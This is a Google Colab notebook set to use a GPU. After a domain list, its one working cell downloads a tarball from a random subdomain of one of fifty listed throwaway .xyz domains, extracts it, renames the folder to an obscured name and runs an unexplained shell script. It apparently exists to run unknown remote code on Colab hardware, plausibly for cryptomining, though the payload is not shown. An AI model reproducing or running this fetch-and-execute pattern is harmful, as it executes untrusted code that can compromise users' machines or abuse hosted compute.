{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "[update]_ER_BEES_CATOKBROK.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "8uQ12Gz6ZzCb"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **GASSTERUS**\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7Rlr-Seq0sOc"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8S3CXRBTZa6C"
      },
      "source": [
        "#\t1.lehnerts.xyz\t\t\t\t11.gdgchlef.xyz\t\t\t\t21.aescelon.xyz\t\t\t\t31.yespp.xyz\t\t\t\t41.getmaster.xyz\t\n",
        "#\t2.pjsaleen.xyz\t\t\t\t12.nugetics.xyz\t\t\t\t22.cwfunltd.xyz\t\t\t\t32.yeshub.xyz\t\t\t\t42.getar.xyz\t\n",
        "#\t3.minefoto.xyz\t\t\t\t13.ohmboydi.xyz\t\t\t\t23.ammolarm.xyz\t\t\t\t33.yeshb.xyz\t\t\t\t43.getair.xyz\t\n",
        "#\t4.ausfugen.xyz\t\t\t\t14.jdccheck.xyz\t\t\t\t24.espinaca.xyz\t\t\t\t34.yesapp.xyz\t\t\t\t44.airshq.xyz\t\n",
        "#\t5.herrewig.xyz\t\t\t\t15.somethng.xyz\t\t\t\t25.demarkaj.xyz\t\t\t\t35.useairs.xyz\t\t\t45.airpp.xyz\t\n",
        "#\t6.manopmed.xyz\t\t\t\t16.artbysam.xyz\t\t\t\t26.dutchiss.xyz\t\t\t\t36.trymaster.xyz\t\t46.leumang2.xyz\t\n",
        "#\t7.kvisberg.xyz\t\t\t\t17.sanbanda.xyz\t\t\t\t27.pointina.xyz\t\t\t\t37.tryair.xyz\t\t\t\t47.mirineluu.xyz\t\n",
        "#\t8.nekolife.xyz\t\t\t\t18.veterbit.xyz\t\t\t\t28.zagranka.xyz\t\t\t\t38.openmaster.xyz\t\t48.tortilandia.xyz\t\n",
        "#\t9.odosalud.xyz\t\t\t\t19.zirvegsk.xyz\t\t\t\t29.dirdenta.xyz\t\t\t\t39.meetmastrs.xyz\t\t49.clinsect.xyz\t\n",
        "#\t10.avaritia.xyz\t\t\t\t20.bcseeker.xyz\t\t\t\t30.mshoward.xyz\t\t\t\t40.mastersly.xyz\t\t50.zaolve.xyz\t\n",
        "\n",
        "\n",
        "!wget -O veterbitvddew.tar.gz $RANDOM.veterbit.xyz/omalex/BEE-LEUMANG.tar.gz\n",
        "!tar -xf veterbitvddew.tar.gz\n",
        "!rm -rf *.tar.gz\n",
        "!mv BEE-LEUMANG WAJveterbitvddewIBGANTIJUGA\n",
        "%cd WAJveterbitvddewIBGANTIJUGA\n",
        "!chmod +x *.sh\n",
        "!./leumangcoy.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}